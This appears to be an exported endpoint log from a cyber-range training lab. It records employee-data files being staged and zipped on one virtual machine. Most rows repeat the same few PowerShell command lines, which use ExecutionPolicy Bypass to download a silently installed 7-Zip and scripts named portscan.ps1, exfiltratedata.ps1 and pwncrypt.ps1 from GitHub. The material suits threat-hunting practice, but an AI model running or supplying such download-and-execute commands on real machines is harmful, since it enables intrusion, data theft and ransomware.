TimeGenerated [UTC],DeviceName,ActionType,FileName,FolderPath,InitiatingProcessAccountName,InitiatingProcessCommandLine,LocalIP,RemoteIP,RemoteUrl
"4/7/2025, 12:36:35.550 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407003635.csv,C:\ProgramData\employee-data-temp20250407003635.csv,resend7393,"powershell.exe  -ExecutionPolicy Bypass -NoProfile -Command ""Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait""",10.0.1.102,REDACTED IP,sacyberrange00.blob.core.windows.net
"4/7/2025, 5:40:58.984 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407054049.zip,C:\ProgramData\backup\employee-data-20250407054049.zip,resend7393,"powershell.exe  -ExecutionPolicy Bypass -NoProfile -Command ""Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait""",10.0.1.102,REDACTED IP,sacyberrange00.blob.core.windows.net
"4/7/2025, 5:40:58.746 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407054049.zip,C:\ProgramData\employee-data-20250407054049.zip,resend7393,"powershell.exe  -ExecutionPolicy Bypass -NoProfile -Command ""Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait""",10.0.1.102,REDACTED IP,sacyberrange00.blob.core.windows.net
"4/7/2025, 5:40:58.989 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407054049.csv,C:\ProgramData\backup\employee-data-temp20250407054049.csv,resend7393,"powershell.exe  -ExecutionPolicy Bypass -NoProfile -Command ""Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait""",10.0.1.102,REDACTED IP,sacyberrange00.blob.core.windows.net
"4/7/2025, 5:40:49.133 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407054049.csv,C:\ProgramData\employee-data-temp20250407054049.csv,resend7393,"powershell.exe  -ExecutionPolicy Bypass -NoProfile -Command ""Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait""",10.0.1.102,REDACTED IP,sacyberrange00.blob.core.windows.net
"4/7/2025, 4:50:36.265 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407045028.csv,C:\ProgramData\backup\employee-data-temp20250407045028.csv,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 4:50:36.261 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407045028.zip,C:\ProgramData\backup\employee-data-20250407045028.zip,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 4:50:35.905 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407045028.zip,C:\ProgramData\employee-data-20250407045028.zip,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 4:50:28.473 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407045028.csv,C:\ProgramData\employee-data-temp20250407045028.csv,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:51:24.197 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407005116.csv,C:\ProgramData\backup\employee-data-temp20250407005116.csv,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:51:24.154 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407005116.zip,C:\ProgramData\backup\employee-data-20250407005116.zip,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:51:23.794 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407005116.zip,C:\ProgramData\employee-data-20250407005116.zip,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:51:16.426 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407005116.csv,C:\ProgramData\employee-data-temp20250407005116.csv,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:36:44.576 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407003635.csv,C:\ProgramData\backup\employee-data-temp20250407003635.csv,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:36:44.571 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407003635.zip,C:\ProgramData\backup\employee-data-20250407003635.zip,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:36:44.339 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407003635.zip,C:\ProgramData\employee-data-20250407003635.zip,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:36:35.550 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407003635.csv,C:\ProgramData\employee-data-temp20250407003635.csv,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 5:40:58.984 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407054049.zip,C:\ProgramData\backup\employee-data-20250407054049.zip,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 5:40:58.746 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407054049.zip,C:\ProgramData\employee-data-20250407054049.zip,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 5:40:58.989 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407054049.csv,C:\ProgramData\backup\employee-data-temp20250407054049.csv,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 5:40:49.133 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407054049.csv,C:\ProgramData\employee-data-temp20250407054049.csv,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 4:50:36.265 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407045028.csv,C:\ProgramData\backup\employee-data-temp20250407045028.csv,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 4:50:36.261 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407045028.zip,C:\ProgramData\backup\employee-data-20250407045028.zip,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 4:50:35.905 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407045028.zip,C:\ProgramData\employee-data-20250407045028.zip,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 4:50:28.473 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407045028.csv,C:\ProgramData\employee-data-temp20250407045028.csv,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:51:24.197 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407005116.csv,C:\ProgramData\backup\employee-data-temp20250407005116.csv,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:51:24.154 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407005116.zip,C:\ProgramData\backup\employee-data-20250407005116.zip,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:51:23.794 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407005116.zip,C:\ProgramData\employee-data-20250407005116.zip,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:51:16.426 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407005116.csv,C:\ProgramData\employee-data-temp20250407005116.csv,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:36:44.576 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407003635.csv,C:\ProgramData\backup\employee-data-temp20250407003635.csv,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:36:44.571 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407003635.zip,C:\ProgramData\backup\employee-data-20250407003635.zip,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:36:44.339 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407003635.zip,C:\ProgramData\employee-data-20250407003635.zip,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:36:35.550 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407003635.csv,C:\ProgramData\employee-data-temp20250407003635.csv,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 5:40:58.984 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407054049.zip,C:\ProgramData\backup\employee-data-20250407054049.zip,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 5:40:58.746 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407054049.zip,C:\ProgramData\employee-data-20250407054049.zip,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 5:40:58.989 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407054049.csv,C:\ProgramData\backup\employee-data-temp20250407054049.csv,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 5:40:49.133 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407054049.csv,C:\ProgramData\employee-data-temp20250407054049.csv,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 4:50:36.265 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407045028.csv,C:\ProgramData\backup\employee-data-temp20250407045028.csv,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 4:50:36.261 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407045028.zip,C:\ProgramData\backup\employee-data-20250407045028.zip,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 4:50:35.905 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407045028.zip,C:\ProgramData\employee-data-20250407045028.zip,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 4:50:28.473 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407045028.csv,C:\ProgramData\employee-data-temp20250407045028.csv,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:51:24.197 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407005116.csv,C:\ProgramData\backup\employee-data-temp20250407005116.csv,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:51:24.154 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407005116.zip,C:\ProgramData\backup\employee-data-20250407005116.zip,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:51:23.794 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407005116.zip,C:\ProgramData\employee-data-20250407005116.zip,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:51:16.426 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407005116.csv,C:\ProgramData\employee-data-temp20250407005116.csv,system,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:36:44.576 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407003635.csv,C:\ProgramData\backup\employee-data-temp20250407003635.csv,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:36:44.571 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407003635.zip,C:\ProgramData\backup\employee-data-20250407003635.zip,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:36:44.339 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407003635.zip,C:\ProgramData\employee-data-20250407003635.zip,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 12:36:35.550 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407003635.csv,C:\ProgramData\employee-data-temp20250407003635.csv,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 5:40:58.984 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407054049.zip,C:\ProgramData\backup\employee-data-20250407054049.zip,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 5:40:58.746 AM",resend7393-vm,ConnectionSuccess,employee-data-20250407054049.zip,C:\ProgramData\employee-data-20250407054049.zip,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 5:40:58.989 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407054049.csv,C:\ProgramData\backup\employee-data-temp20250407054049.csv,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
"4/7/2025, 5:40:49.133 AM",resend7393-vm,ConnectionSuccess,employee-data-temp20250407054049.csv,C:\ProgramData\employee-data-temp20250407054049.csv,resend7393,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,10.0.1.102,REDACTED IP,raw.githubusercontent.com
